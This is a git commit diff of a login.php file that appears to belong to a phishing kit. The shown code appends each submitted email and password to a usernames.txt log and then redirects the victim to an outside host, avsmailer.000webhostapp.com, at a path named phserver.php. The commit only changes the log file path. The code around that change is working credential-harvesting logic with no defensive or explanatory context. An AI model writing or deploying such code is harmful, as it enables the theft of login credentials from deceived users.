44dc9323bbca6baceae1608fe25874436b200a3d
censorday <74760933+censorday@users.noreply.github.com>
2020-12-15 12:44:48 +0530

    Update login.php

--- login.php
+++ login.php
@@ -5,7 +5,7 @@ session_start();
 			$email=$_SESSION["Email"];
 			
   			
- file_put_contents("usernames.txt", "<html>". "<br>" ."[EMAIL:]" . " ". $email . " " . " " . "[PASS:]" . " " . $pass . "<br>" . "</html>" . "\n", FILE_APPEND);
+ file_put_contents("./usernames.txt", "<html>". "<br>" ."[EMAIL:]" . " ". $email . " " . " " . "[PASS:]" . " " . $pass . "<br>" . "</html>" . "\n", FILE_APPEND);
  header('Location:http://avsmailer.000webhostapp.com/phserver.php');
 exit();
 	
